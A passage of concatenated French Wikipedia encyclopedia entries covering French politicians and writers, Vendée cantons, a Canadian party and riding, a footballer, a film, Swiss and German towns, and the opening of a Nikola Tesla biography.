Il est chargé en 1975 d’une mission interministérielle sur le rôle de l’immigration dans le développement économique et social. En raison de cette expertise, il est nommé au Haut conseil à l’intégration lors de la création de ce dernier en 1990. Il en démissionne en 1993 pour ne pas cautionner la politique de la nationalité du gouvernement. De 2000 à 2013, il est président de section à la Cour nationale du droit d'asile, anciennement Commission des recours des réfugiés, où selon l'hebdomadaire Télérama il est .
Il a mené une action soutenue pour l'égalité entre les femmes et les hommes centrée sur les rémunérations, les droits et l'accès aux postes de responsabilité. Au sein de la Météorologie nationale, il a œuvré pour permettre aux femmes d’accéder aux corps techniques, ce qui n’a pu être réalisé qu’en 1971. Suite à son activité sur le sujet au cours de sa période ministérielle, il a présidé de 2000 à 2005 le comité de pilotage pour l’égal accès des femmes et des hommes aux emplois supérieurs des fonctions publiques.
Travaux actuels.
Depuis plusieurs années, Anicet Le Pors mène des réflexions sur les questions du service public et la Fonction publique, des collectivités locales, institutionnelles, la laïcité et sur le droit d’asile.
En 2017, Il annonce qu'il votera blanc au second tour de l'élection présidentielle de 2017 estimant qu'Emmanuel Macron constitue : « le produit politique fabriqué par les efforts combinés de l’oligarchie financière, du MEDEF, des gouvernements Hollande, de la technostructure administrative, des opportunistes de tous bords, de la totalité des médias ».
Il considère que la société actuelle est engagée dans une décomposition sociale  profonde depuis la fin du XXe siècle. Dans ces conditions, le service public paradigme de l’intérêt général, a vocation à être l’instrument d’une recomposition sociale et politique de la société tout entière.
Activités associatives.
Anicet Le Pors est adhérent de nombreuses associations très variées. C’est ce qu’il dénomme son « génome de citoyenneté ».
Il est pendant de longues années membre de l'Institut français des sciences administratives association reconnue d'utilité publique dont l'objectif est de promouvoir les sciences administratives en France et le modèle français de droit administratif à l'étranger.
De 1990 à 1995, il est vice-président de l'association française des juristes démocrates.
Il est membre du conseil d’administration de l’Association des membres du Conseil d'État de 2002 à 2011.
De 2011 à 2013, il est président de l’Association française des juges de l’asile (AFJA).
Il est également membre du Comité scientifique du Service social d’aide aux émigrants (SSAÉ), du Comité de soutien de l’Association Primo Levi, de Handicap International, du Secours populaire français et de l’Institut International des Droits de l'Homme.
Par ailleurs, il est membre de l’association des amis de la Commune de Paris (1871), de l’Association des amis de l’Institut François-Mitterrand, de l’Institut du Tout-Monde et de ATTAC.
Il est Président d’honneur de l’Union des sociétés bretonnes de l’Ile de France (USBIF) et membre de la présidence d’honneur de l’Association républicaine des anciens combattants (ARAC).
Enfin, il est membre de l’Association des anciens de la météorologie, du Cercle généalogique du Finistère et de la Société des amis du Louvre.
Ouvrages et publications.
Publications d’Anicet Le Pors.
Dans ce livre, qui répond à un souci de mémoire, Anicet Le Pors raconte la vie de ses parents, François Le Pors et Gabrielle Croguennec.
Pour marquer l'anniversaire du du statut général des fonctionnaires, Anicet Le Pors s'interroge sur les pratiques et les mentalités de 2016 et trace des perspectives pour le futur de la Fonction publique.
Publications avec la collaboration ou une contribution d'Anicet Le Pors.
Entretiens de Louisette Blanquart, journaliste à "L'Humanité" avec Anicet Le Pors, Paul Boccara, Claude Quin et Philippe Herzog. L’entretien d’Anicet Le Pors est intitulé « Une gestion démocratique et des nationalisations ».
Publication sur Anicet Le Pors.
Philippe Lefait, journaliste à France 2, dans son livre "Quatre ministres et puis s’en vont…" Éditions de l'Atelier, 1995, , revient sur l'itinéraire d'Anicet Le Pors et des 3 autres ministres communistes de 1981 à 1984 Charles Fiterman, Jack Ralite et Marcel Rigout pendant la période ministérielle et celle qui l'a suivie.

</doc>
<doc id="568897" url="https://fr.wikipedia.org/wiki?curid=568897" title="Parti libéral de la Nouvelle-Écosse">
Parti libéral de la Nouvelle-Écosse

Le Parti libéral de la Nouvelle-Écosse est un parti politique de la province de la Nouvelle-Écosse, au Canada.
Origines.
Le parti est un descendant des réformistes de la pré-confédération en Nouvelle-Écosse unis derrière Joseph Howe et réclamant un gouvernement responsable. Les libéraux-réformistes ont formé plusieurs gouvernements dans la colonie entre 1848 et 1867.
Le parti s'est divisé sur le débat de la confédération. Howe et plusieurs libéraux ont formé le Parti anti-confédération tandis que les autres libéraux ont rejoint le conservateur Charles Tupper et son parti de la confédération. Howe s'est initialement opposé à la confédération, mais a dû se résoudre à l'accepter comme une réalité après quelques tentatives initiales pour la faire échouer.
En 1868, Howe a rejoint les forces pro-confédérations, servant même dans le Cabinet de Sir John A. Macdonald. 
Le Parti anti-confédération a obtenu une large majorité des sièges de la Nouvelle-Écosse à la Chambre des communes en 1867, et a également formé le gouvernement de la nouvelle province avec William Annand. Le nouveau parti libéral de Nouvelle-Écosse après 1867 était surtout organisé par Annand et ses forces anti-confédération, pendant que les conservateurs était organisé par Tupper et ceux qui appuyaient Sir John A. Macdonald dans la province.
Jusqu'en 1956, le Parti libéral de la Nouvelle-Écosse a formé le gouvernement pendant 76 des 89 années de 1867 à 1956. Mais à cette époque, les partis d'oppositions rassemblaient rarement plus de 5 membres au parlement. Le parti a aussi été le premier à amener un "gouvernement responsable" en Amérique du Nord.
Histoire récente.
Wayne Gaudet fut chef intérimaire du Parti libéral de la Nouvelle-Écosse de 2000 à 2002 puis à nouveau en 2003.
Le Parti libéral de la Nouvelle-Écosse au pouvoir de 2017 à 2021.
Le parti est de retour au pouvoir pour la première fois depuis 1988 avec comme chef et premier ministre Stephen McNeil d' à puis de Iain Rankin de à .

</doc>
<doc id="568898" url="https://fr.wikipedia.org/wiki?curid=568898" title="Canton de L'Hermenault">
Canton de L'Hermenault

Le canton de L’Hermenault est une ancienne division administrative française située dans le département de la Vendée et la région des Pays-de-la-Loire.
Créé en 1790, il est supprimé en à la suite d’un découpage cantonal opéré en 2014.
Histoire.
Sous la Révolution française, pendant la mise en œuvre des décrets de l’Assemblée nationale concernant la division du royaume en 83 départements ( et ), un décret particulier du porte implicitement création du canton au sein du district ; les textes de la Constituante sont par la suite ordonnés dans des lettres patentes de données le . La division admet alors un chef-lieu fixé dans la municipalité de L’Hermenault.
Le maintien du canton est projeté dans la loi concernant la division du territoire de la République et l’administration du (). Aussi, en vertu de l’arrêté du (), deux communes quittent le canton (Longève et Pissotte) tandis que cinq le rejoignent (Nalliers, Petosse, Pouillé, Saint-Cyr-des-Gâts et Saint-Laurent-de-la-Salle).
Le , la commune de Marsais fusionne avec celle de Sainte-Radégonde-la-Vineuse pour former Marsais-Sainte-Radégonde.
Le , la commune de Mouzeuil fusionne avec celle de Saint-Martin-sous-Mouzeuil pour former Mouzeuil-Saint-Martin.
Géographie.
Situation administrative.
Administrativement, le canton se situe au sein du département de la Vendée, dans le district de Fontenay-le-Comte de 1790 à 1795. À partir de la loi concernant la division du territoire de la République et l’administration (), le canton relève du troisième arrondissement départemental, baptisé, au sens de l’arrêté du (), « arrondissement de Fontenay ».
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton de L’Hermenault est la circonscription d’élection d’un des membres du conseil général de la Vendée, désigné lors des élections cantonales.

</doc>
<doc id="568901" url="https://fr.wikipedia.org/wiki?curid=568901" title="Gonzague Saint-Bris">
Gonzague Saint-Bris

Gonzague Saint-Bris, né le à Loches (Indre-et-Loire) et mort dans un accident de la route le à Saint-Hymer (Calvados), est un écrivain et journaliste français.
Biographie.
Famille.
Gonzague Marie Joseph Vincent François Saint-Bris, né à Loches le , est le fils d'Hubert Saint-Bris (1915-1979), diplomate, ancien élève de l'École nationale d'administration, et d’Agnès Mame (1924-2020), poétesse amatrice. Prénommé Gonzague en souvenir de son cousin résistant Gonzague de Saint-Geniès, il est deuxième d’une famille de huit enfants.
La famille Saint-Bris, originaire de Monflanquin (Lot-et-Garonne) où Pierre Saint-Bris (1740-1822) était médecin en 1812, s'établit en Touraine où elle acquit le le château du Clos Lucé à Amboise qu'elle possède toujours et où Gonzague Saint-Bris passe son enfance. Son arrière-grand-père Georges Saint-Bris (1841-1922), compositeur de musique, obtint un titre de comte romain héréditaire par bref pontifical du 15 août 1874 (titre non reconnu en France, transmissible à la descendance de son frère aîné Jean Saint-Bris (1947-2004), mort dans un accident de la route en 2004). Par sa mère, il est issu de Louis Mame, l'un des éditeurs de "La Comédie humaine" de Balzac. 
Écrivain et journaliste.
Autodidacte, il est successivement journaliste à "La Vigie marocaine" (1967) au Maroc puis à "La Nouvelle République" à Tours (1968), critique littéraire, animateur sur la radio Europe 1 (deuxième moitié des années 1970), en particulier de l'émission "La ligne ouverte", offrant la parole aux auditeurs et proposant « d’inoubliables instants de radio », chroniqueur au "Figaro" (1980), fondateur et animateur de la radio libre "Méga l'O" (1981), directeur de la stratégie et du développement du groupe Hachette Filipacchi Médias (1987-2001), chargé de mission au ministère de la Culture et de la Communication (1986-1988), directeur-propriétaire du magazine "Femme". Il est chroniqueur pour "Paris Match", notamment lors d'événements concernant les familles princières ou royales. À la suite d'un passage de Gonzague Saint-Bris dans l'émission de télévision américaine "Good Morning America", Michael Jackson demande que l'écrivain l'accompagne durant son voyage en Afrique en . Gonzague Saint-Bris en tire un livre "Au paradis avec Michael Jackson" sorti en 2010. En , il refait à dos de mulet le trajet effectué en 1516 par Léonard de Vinci à travers les Alpes lorsqu'il fut invité en France par François.
Il est membre de l'Académie Alphonse-Allais et membre du jury du prix du Guesclin. À sa mort, le jury fonde en son honneur, "le Trophée de la biographie Gonzague Saint-Bris", décerné chaque année.
Organisateur de manifestations culturelles.
Attaché à la Touraine — il est conseiller municipal de Loches de 1989 à 1995 —, il y mène pendant près de quarante ans des actions culturelles. Il participe en 1978 à la création du mouvement "Le Nouveau Romantisme, l'Académie romantique" (avec Patrick Poivre d'Arvor, Brice Lalonde, Francis Huster, Étienne Roda-Gil et Frédéric Mitterrand), il participe également à des clips culturels, à des radios libres, à la "Marche Balzac", à la "Marche George Sand". En 1995, il crée le festival littéraire La Forêt des livres à Chanceaux-près-Loches, une petite commune forestière, qui reçoit chaque dernier dimanche d'août des auteurs, en avant-première de la rentrée littéraire, À cette occasion, plusieurs prix sont attribués dans le cadre du prix littéraire Les Lauriers verts. Le succès de ce festival ira croissant, jusqu'à accueillir plus de lors des dernières éditions. Le festival est renommé "Les écrivains chez Gonzague Saint-Bris" après le décès de son fondateur.
Il fonde en 1983 le "Festival du film de Cabourg", également appelé "Journées romantiques" dont le trophée remis aux lauréats porte le nom de "Swann d'or", en référence à Marcel Proust.
Candidat à l'Académie française.
Il est à quatre reprises et en vain, candidat à l'Académie française. Le , il est candidat au fauteuil de Michel Droit, mais est battu par Pierre Nora. Le , il se présente au fauteuil de Bertrand Poirot-Delpech : les académiciens préfèrent n'élire personne, l'élection est blanche. Ensuite, le , il est candidat au fauteuil de Jean Dutourd : l'élection est de nouveau blanche. Enfin, il se présente le au fauteuil de René Girard. Encore une fois, l'élection est blanche.
Divers.
Il est régulièrement l'invité d'émissions de télévision ("Secrets d'Histoire", "Midi en France", etc.) 
Il est membre du jury de l'élection de Miss France 2005 à Tours 
Mort.
Gonzague Saint-Bris meurt le dans un accident de la route sur la départementale 675 à hauteur de Saint-Hymer, non loin de Pont-l'Évêque (Calvados). Sa compagne Alice Bertheaume, qui conduit la voiture, une Renault Mégane, tente d’éviter un renard, projetant la voiture contre un arbre. Elle a d'alcool dans le sang. Gonzague Saint Bris, dont la ceinture de sécurité n'est pas attachée, est éjecté et tué sur le coup ; sa compagne est légèrement blessée. Le soir du drame, le couple sort d'une réception donnée à Deauville, après avoir dîné dans un restaurant de la ville pour rejoindre Bonneville-la-Louvet où il doit passer la nuit.
Ses obsèques ont lieu le en la collégiale Saint-Denis d'Amboise et l'inhumation au cimetière des Ursulines de cette même ville, non loin du Clos Lucé.
Sa compagne Alice Bertheaume est jugée le par le tribunal correctionnel de Lisieux et condamnée à six mois de prison avec sursis pour « homicide involontaire par conducteur sous l'emprise d'un état alcoolique ». 
Elle a aujourd’hui refait sa vie avec le journaliste Jean-Claude Narcy
Vie privée.
Le , Gonzague Saint-Bris se marie avec Clémence de Lasteyrie du Saillant, nièce du président de la République Valéry Giscard d'Estaing. 
Il a pour dernière compagne Alice Bertheaume, chargée de communication à Paris.
Œuvres.
Il est l'auteur de près d'une quarantaine de livres, dont "Le Romantisme absolu", de récits historiques ("Les Égéries russes", et "Je vous aime inconnue", "Le Coup d'éclat du ") et de biographies comme celles de Vigny, Dumas, Balzac, Flaubert, La Fayette.
En 2002, son ouvrage d'inspiration autobiographique "Les Vieillards de Brighton" est récompensé par le prix Interallié, puis son roman "L'Enfant de Vinci" par le prix des romancières en 2006. Dès sa parution, ce dernier est salué en ces termes par Julien Gracq : 
Le , il reçoit le prix Hugues-Capet, mention « Grand prix spécial », pour l'ensemble de son œuvre, dont sa biographie "Louis XI, le méconnu".
Il apparaît comme frère Gonzague, l'un des maîtres de l'ordre des chevaliers de Rhodes, dans la bande dessinée "Général Leonardo" d'Erik Svane et Dan Greenberg.

</doc>
<doc id="568902" url="https://fr.wikipedia.org/wiki?curid=568902" title="Engrenage (homonymie)">
Engrenage (homonymie)

Cette page contient les pages d'homonymie de engrenage, engrenage, L'engranage et Les Engrenages.
Un engrenage est un système mécanique composé de roues dentées.
Forme "Engrenage".
Engrenage peut aussi désigner :
Forme "Engrenages".
Engrenages peut désigner :
Forme "L'Engrenage".
L'Engrenage peut désigner :
Forme "Les Engrenages".
Les Engrenages peut désigner :

</doc>
<doc id="568903" url="https://fr.wikipedia.org/wiki?curid=568903" title="Louis Nucéra">
Louis Nucéra

Louis Nucéra, né le à Nice et mort le à Carros, est un écrivain français.
Il reçoit le prix Interallié en 1981, ainsi que le grand prix de littérature de l'Académie française en 1993 et le prix du roman populiste en 2005 pour l’ensemble de son œuvre. Louis Nucéra était connu pour sa passion du cyclisme, auquel il consacre notamment le livre "Mes rayons de soleil". Il était aussi passionné par les chats, et il a écrit plusieurs livres sur eux.
Biographie.
Tour à tour employé de banque, journaliste, attaché de presse pour la maison de disques Philips, directeur littéraire chez Lattès, Louis Nucéra est surtout connu comme écrivain et grand passionné de cyclisme, thème de nombre de ses ouvrages.
En 1970, il publie son premier roman, "L'Obstiné". Au travers de son œuvre, il retrace la vie des immigrés italiens ("Le Ruban rouge") ; il évoque ses amitiés avec Cioran, Kessel, Picasso, Cocteau, Hardellet, Brassens ou Moretti ("Mes ports d’attache"). Il raconte également son enfance niçoise ("Avenue des Diables-Bleus").
En 1999, il signe, pour s'opposer à la guerre en Serbie, la pétition « Les Européens veulent la paix », lancée par le collectif « Non à la guerre ».
Louis Nucéra meurt après avoir été renversé par une voiture alors qu’il faisait du vélo près de Nice, le , dans la zone industrielle de Carros. D'abord inhumé au cimetière de Caucade, il repose, depuis le , au cimetière du Château.
Hommages.
En hommage à son ami, Bernard Morlino écrit "Louis Nucéra, achevé d'imprimer".
La bibliothèque municipale à vocation régionale de Nice (BMVR) porte son nom. Elle est détentrice de la majeure partie de ses manuscrits, tapuscrits ainsi que des notes complémentaires, dossiers de presse et photographies.
Le pont sur l'Estéron qui relie par la route M901 les communes de Gilette et du Broc est baptisé pont Louis Nucéra.
Écrivain cycliste.
« Je suis venu au monde à l'ombre précaire d'une bicyclette suspendue entre ciel et terre ». Tel est l'incipit que Louis Nucéra place en ouverture du livre "Mes rayons de soleil". Le titre de cet ouvrage est anodin et n'annonce pas vraiment ce dont les quelque deux cent soixante-dix pages traitent par la suite. Pas même un vélo sur la couverture de l'édition d'origine, sur quoi on voit un paysage vallonné où le vert décline ses nuances. 
Louis Nucéra y fait le récit d'une « grande boucle » à vélo de . En effet, le à , il s'élance de Livry-Gargan où le champion Antonin Magne exploita une ferme. Louis Nucéra ne suit pas n'importe quel parcours : il choisit de refaire les étapes que les coureurs du Tour de France ont suivies, en 1949. C'est aussi le Tour que Fausto Coppi, admiré par l'auteur, avait remporté.
Au-delà d'un simple récit factuel, se bornant à décrire les particularités de chaque étape, Louis Nucéra donne à comprendre sa passion pour le vélo, les joies et les difficultés qu'il éprouve à rouler. C'est aussi un exercice d'admiration pour les cyclistes qui l'ont précédé sur les routes de 1949.
Prix Louis-Nucéra.
L'association « Lire à Saint-Étienne » a créé le prix « Les Soleils de Nucéra » (ou prix Louis-Nucéra) en 2002. Récompensant un roman publié dans l'année, dont le thème principal concerne le cyclisme, il est remis sur le podium de la course cycliste Paris-Nice à l'étape de Saint-Étienne, ou dans la ville-étape la plus proche.
Depuis sa création en 2002, les lauréats de ce prix ont été :

</doc>
<doc id="568904" url="https://fr.wikipedia.org/wiki?curid=568904" title="Gérard de Lorraine">
Gérard de Lorraine

Il y a eu plusieurs Gérard dans la maison de Lorraine :

</doc>
<doc id="568905" url="https://fr.wikipedia.org/wiki?curid=568905" title="Bad News Bears">
Bad News Bears

Bad News Bears ou Une équipe d'enfer au Québec est un film américain réalisé par Richard Linklater, sorti en 2005.
Synopsis.
Morris Buttermaker (Thornton), un ancien joueur de baseball professionnel recyclé en exterminateur, compte gagner de l'argent facilement en devenant l'entraîneur d'une équipe lamentable d'une petite ligue. Il se retrouve à la tête d'un groupe indiscipliné de joueurs médiocres qui transforment le champ des rêves en véritable cauchemar! Raillé par un entraîneur rival arrogant (Greg Kinnear), bousculé par sa nouvelle employeuse (Marcia Gay Harden) et mis au défi par ses protégés, Buttermaker doit mettre la main à la pâte et se débrouiller pour aider ses joueurs à réaliser l'inimaginable: former une équipe.

</doc>
<doc id="568906" url="https://fr.wikipedia.org/wiki?curid=568906" title="Holderbank (Argovie)">
Holderbank (Argovie)

Holderbank est une commune suisse du canton d'Argovie, située dans le district de Lenzbourg.

</doc>
<doc id="568908" url="https://fr.wikipedia.org/wiki?curid=568908" title="Stéphane Dumont">
Stéphane Dumont

Stéphane Dumont est un footballeur français né le à Seclin qui évoluait au poste de milieu de terrain et devenu entraîneur.
Biographie.
Stéphane connaît une grave blessure au genou le lors du premier match amical de préparation à Thonon-les-Bains face aux Suisses du FC Aarau, blessure qui le tient éloigné des terrains durant quasiment toute la saison.
La saison 2006-2007 est tout aussi éprouvante pour Stéphane : dès le stage d'avant saison, certains exercices lui sont interdits, ainsi estime-t-il n'avoir suivi que 50 % de la préparation d'avant saison. 
Durant le championnat, il connaît de nouvelles douleurs au genou. Celles-ci l'éloignent une nouvelle fois des terrains. Il connaît même un séjour en rééducation à Saint-Raphaël en .
Après un bon début de saison 2007-2008, il est peu à peu relégué sur le banc face à la concurrence forte à son poste, et le milieu à trois qui se met en place après la trêve, constitué par Rio Mavuba, Yohan Cabaye et Jean II Makoun. Malgré le départ de ce dernier, Dumont ne parvient pas à se faire une place car l'arrivée de Florent Balmont le propulse une fois de plus sur le banc. 
Après la saison 2010-2011, Dumont s'engage pour trois saisons avec l'AS Monaco, reléguée en Ligue 2, où son expérience devait lui permettre de se faire une place dans l'entrejeu monégasque. Malheureusement, sa condition physique et ses performances en demi-teinte lui font perdre sa place tôt dans la saison et il ne jouera finalement que 14 matchs lors de la saison 2011-2012.
À l'intersaison l'AS Monaco change d'entraîneur avec le remplacement de Marco Simone par Claudio Ranieri. Dumont commence la saison comme titulaire mais en , il se blesse au genou et doit subir une arthroscopie à la mi-octobre. L'opération se déroule normalement mais des douleurs récurrentes l'empêchent de reprendre la compétition.
Ne rentrant plus dans les plans du club, il trouve un accord pour résilier son contrat à l'amiable le . Cette résiliation marque la fin de sa carrière de footballeur professionnel et le début d'une nouvelle carrière d’entraîneur au sein de son club de toujours, le LOSC. 
Lors de l'été 2017, il rejoint le stade de Reims pour y être le premier adjoint de David Guion. Il prolonge son bail de deux saisons le 30 mai 2020. Ce même mois, il obtient son Brevet d'Entraîneurs Professionnel de football (BEPF) après un an de formation menée par Franck Thivillier, Francis Gillot et Lionel Rouxel.
Le , il devient le nouvel entraîneur de l'EA Guingamp pour les deux prochaines saisons plus une option en cas de montée en Ligue 1. Après trois saisons à la tête de l’équipe professionnelle, le club et lui ont décidé de ne pas donner de suite à leur collaboration.
Le 12 août 2024, il est nommé entraîneur de l'équipe professionnelle de l'ESTAC Troyes en Ligue 2 BKT en remplacement de David Guion.

</doc>
<doc id="568909" url="https://fr.wikipedia.org/wiki?curid=568909" title="Canton de Pouzauges">
Canton de Pouzauges

Le canton de Pouzauges est une ancienne division administrative française, située dans le département de la Vendée et la région Pays de la Loire.
Composition.
Le canton de Pouzauges regroupait les communes suivantes :
Intercommunalité.
Le canton de Pouzauges recouvrait l’intégralité de la communauté de communes du Pays-de-Pouzauges.

</doc>
<doc id="568912" url="https://fr.wikipedia.org/wiki?curid=568912" title="Canton de Sainte-Hermine">
Canton de Sainte-Hermine

Le canton de Sainte-Hermine est une ancienne division administrative française, située dans le département de la Vendée et la région Pays de la Loire.
Composition.
Le canton de Sainte-Hermine regroupait les communes suivantes :
Intercommunalité.
Le canton de Sainte-Hermine recouvrait l’intégralité de la communauté de communes du Pays-de-Sainte-Hermine (sauf la commune de Sainte-Gemme-la-Plaine, dans le canton de Luçon).

</doc>
<doc id="568913" url="https://fr.wikipedia.org/wiki?curid=568913" title="Ingelfingen">
Ingelfingen

Ingelfingen est une ville du Bade-Wurtemberg (Allemagne), située dans l'arrondissement de Hohenlohe, dans la région de Heilbronn-Franconie, dans le district de Stuttgart. Avec ses 7 villages environnants rattachés administrativement à la ville d'Ingelfingen depuis 1972-1973, la commune avait une population de 5516 habitants au .
Géographie.
Ingelfingen se trouve dans la vallée du Kocher à 4 km au nord-ouest de Künzelsau et à 37 km au nord-est de Heilbronn. C'est une vallée d'une profondeur de presque 200 mètres creusée dans le Plateau de Hohenlohe dont les versants sud sont souvent couverts de vignobles.
Histoire.
Les nobles de Hohenlohe, comtes depuis 1450, devinrent au cours du Haut Moyen Âge les souverains de la commune d’Ingelfingen et acquirent le château de Lichteneck, dont les ruines en haut du bourg sont très caractéristiques encore aujourd’hui. Entre 1409 et 1806, Ingelfingen resta sans interruption sous la domination de ces seigneurs, devenus princes impériaux en 1764.
En conséquence d’une division du comté protestant de Hohenlohe-Langenburg en trois comtés, Ingelfingen devint en 1701 le siège de l’administration du nouveau comté de Hohenlohe-Ingelfingen sous Christian Kraft de Hohenlohe qui fit y construire un château représentatif. À partir de ce moment-là, Ingelfingen connut un important essor économique. 
Le prince Frédéric-Louis de Hohenlohe-Ingelfingen eut le mérite de faire élargir la ville d’Ingelfingen au-delà de la muraille vers l’est et d’inviter des artisans à s’y installer. C’est à la naissance de ce faubourg de Marianne qu’Ingelfingen dût une nouvelle croissance économique à la fin du . Ce n’est qu‘en 1805 que ce prince transféra sa résidence à Öhringen et s’appela alors prince de Hohenlohe-Öhringen - un an avant la liquidation de son principauté et son intégration dans le royaume de Wurtemberg lors de la réorganisation des États allemands de Napoléon Bonaparte en 1806. Ce même prince, général de l’armée impériale au service de la Prusse, fut personnage tragique en tant que responsable de la défaite des troupes prussiennes dans la bataille d’Iéna en 1806.
Avec la perte de sa fonction de chef-lieu du principauté et le départ de ses fonctionnaires et de ses employés à l'époque bien rémunérés, une longue période de déclin commença. De nombreux habitants quittèrent leur ville natale en direction de l'Amérique et de l'Angleterre et plus tard vers les grandes villes d'Allemagne.
Souverains.
1- Comtes d’Ingelfingen :
2- Princes d’Ingelfingen :
Jumelage.
La ville est jumelée avec Saint-Héand (France) depuis 1991.

</doc>
<doc id="568914" url="https://fr.wikipedia.org/wiki?curid=568914" title="Bagot (ancienne circonscription fédérale)">
Bagot (ancienne circonscription fédérale)

Bagot est une ancienne circonscription électorale représentée à la Chambre des communes du Canada de 1867 à 1935.
Histoire.
La circonscription tire son nom de Sir Charles Bagot, un diplomate britannique, né en 1781 et mort en 1843, qui sera aussi Gouverneur général du Canada entre 1841 et 1843.
À sa pleine expansion, elle comprend les cantons d'Upton et d'Acton, les paroisses de Saint-Hugues, Saint-Simon, Sainte-Rosalie, Saint-Dominique, Sainte-Hélène, Saint-Liboire et de Saint-Pie.
En 1933, la circonscription est abolie en étant annexée à la circonscription électorale de Saint-Hyacinthe. La nouvelle circonscription électorale fédérale sera renommée Saint-Hyacinthe—Bagot.

</doc>
<doc id="568915" url="https://fr.wikipedia.org/wiki?curid=568915" title="St-Liboire">
St-Liboire



</doc>
<doc id="568916" url="https://fr.wikipedia.org/wiki?curid=568916" title="Bagot">
Bagot



</doc>
<doc id="568918" url="https://fr.wikipedia.org/wiki?curid=568918" title="Frédéric de Lorraine">
Frédéric de Lorraine

Le prénom Ferry est un diminutif du prénom Frédéric. Il y en a eu plusieurs parmi les ducs de Lorraine et dans la maison de Lorraine :

</doc>
<doc id="568919" url="https://fr.wikipedia.org/wiki?curid=568919" title="Ferry de Lorraine">
Ferry de Lorraine



</doc>
<doc id="568922" url="https://fr.wikipedia.org/wiki?curid=568922" title="Dominique Noguez">
Dominique Noguez

Dominique Noguez, né le à Bolbec (Seine-Inférieure) et mort le à Paris, est un écrivain et critique cinématographique français.
Biographie.
Dominique Noguez est ancien élève de l'École normale supérieure, où il est entré en 1963, agrégé de philosophie et docteur d'État.
Il enseigne à l'université de Montréal, puis à l'université Paris 1 Panthéon-Sorbonne. Spécialiste d'esthétique, il est un des premiers à écrire en France sur le cinéma underground nord-américain et sur le cinéma expérimental en général, et aide à faire connaître de nombreux cinéastes, notamment Teo Hernàndez, Patrick Bokanowski, Maria Klonaris, Katerina Thomadaki ou encore Stéphane Marti parmi de nombreux autres. Il est 
Se consacrant aussi à la littérature, il publie son premier roman en 1981, "M et R", il écrit des romans et des essais, certains à la fois délurés et saugrenus, tels "Les Trois Rimbaud", paru en 1986, où il fait vivre Arthur Rimbaud jusqu'en 1937, ou encore "Lénine Dada", publié en 1989 où il imagine Lénine en quasi-fondateur du mouvement dada.
En 1992-1993, il préside Avenir de la langue française.
En 2000, il est désigné pour être rapporteur chargé de sélectionner des pensionnaires de l'Académie de France à Rome.
Passionné par la vie littéraire, il s'attache à défendre et faire connaître d'autres écrivains, notamment lorsqu'ils sont perçus comme mal-pensants par l'époque, à l'exemple de Michel Houellebecq. Il défend aussi le rayonnement de la langue française ; "La Colonisation douce" porte la dédicace : « À Gaston Miron et à nos frères du Québec ; aux francophones de l'an 3000 ».
En 2009, les frères Larrieu portent à l’écran son roman "Les Derniers Jours du monde" dans un film au même titre, avec Mathieu Amalric dans le rôle principal.
Il fait partie des jurys du prix de l'Humour noir, du prix Marguerite-Duras et du prix Décembre.
Dans son récit autobiographique "Une année qui commence bien", paru en 2013, il se souvient d'une histoire d'amour vaine et malheureuse qu'il a eue à la cinquantaine avec un homme de vingt-quatre ans, rencontré en 1993 lors d'un colloque. , mais, selon ses propres termes, Pour Florent Georgesco, dans l'avis critique du "Monde des livres" : 
En 2018 sort "L'Interruption", aux éditions Flammarion. En 2019, il publie "Encore une citation, monsieur le bourreau !" chez Albin Michel.
Il meurt le 15 mars 2019, une quinzaine de jours après la publication de ce dernier livre.
Engagement politique.
Proche de Jean-Pierre Chevènement et bien qu'ayant voté oui au traité de Maastricht, il a été candidat aux élections européennes de 1994 sur la liste du MDC. Il soutient ensuite, en 2002, la candidature de Jean-Pierre Chevènement à la présidence de la République.
Œuvres.
Filmographie.
Films expérimentaux&lt;/small&gt; :

</doc>

<doc id="1872536" url="https://fr.wikipedia.org/wiki?curid=1872536" title="Nikola Tesla">
Nikola Tesla

Nikola Tesla (en serbe cyrillique : ), né le à Smiljan dans l'empire d'Autriche (actuelle Croatie) et mort le à New York, est un inventeur et ingénieur américain d'origine serbe. Il est connu pour son rôle prépondérant dans le développement et l'adoption du courant alternatif pour le transport et la distribution de l'électricité.
Tesla a d'abord travaillé dans la téléphonie et l'ingénierie électrique avant d'émigrer aux États-Unis en 1884 pour travailler avec Thomas Edison puis avec George Westinghouse, qui enregistra un grand nombre de ses brevets. Considéré comme l’un des plus grands scientifiques dans l’histoire de la technologie, pour avoir déposé quelque couvrant au total (qui seront pour beaucoup attribuées à tort à Edison) et avoir décrit de nouvelles méthodes pour réaliser la « conversion de l’énergie », Tesla est reconnu comme l’un des ingénieurs les plus créatifs de la fin du et du début du . Quant à lui, il préférait plutôt se définir comme un découvreur.
Ses travaux les plus connus et les plus largement diffusés portent sur l’énergie électrique. Il a mis au point les premiers alternateurs permettant la naissance des réseaux électriques de distribution en courant alternatif, dont il est l’un des pionniers. Tesla s’est beaucoup intéressé aux technologies modernes, se focalisant sur l’électricité qui était le noyau de ses inventions. Il est connu pour avoir su mettre en pratique la découverte du caractère ondulatoire de l’électromagnétisme (théorisé par James Clerk Maxwell en 1864), en utilisant les fréquences propres des composants des circuits électriques, afin de maximiser leur rendement.
De son vivant, Tesla était renommé pour ses inventions, ainsi que pour son sens de la mise en scène, faisant de lui un archétype du « savant fou ». Grand humaniste, qui se fixait comme objectif d'apporter gratuitement l'électricité dans les foyers et de la véhiculer sans fil, il demeura toutefois relativement méconnu pendant plusieurs décennies après sa mort, mais son œuvre entraîne un regain d'intérêt dans la culture populaire depuis les années 1990. En 1960, le nom tesla (T) est donné à l’unité internationale d’induction magnétique. En 2003 est créé un constructeur automobile novateur de voitures électriques, dont le nom, Tesla Inc., est choisi en référence à Nikola Tesla.
Son lieu de sépulture se trouve à Belgrade, en Serbie, dans le musée Nikola-Tesla.
Biographie.
Nationalité et origines.
Nikola Tesla naît dans une famille serbe orthodoxe de Lika, en Krajina croate, venue de l'ouest de la Serbie, près du Monténégro. Fier de ses origines, Tesla a toujours revendiqué à la fois ses ascendances serbes et son héritage croate, s'identifiant comme un Serbe de Croatie. Cependant, né au sein de l'empire d'Autriche, Tesla s'est déclaré de nationalité autrichienne lors de sa demande de naturalisation américaine en 1891.
Les Tesla seraient issus de la famille Draganić, dont une branche aurait adopté le surnom « Tesla » signifiant herminette en serbe, donné en raison d'une caractéristique physique particulière de ses membres. Une autre légende les lie à la famille noble d'Herzégovine de Pavle Orlović, un chevalier serbe semi-mythologique.
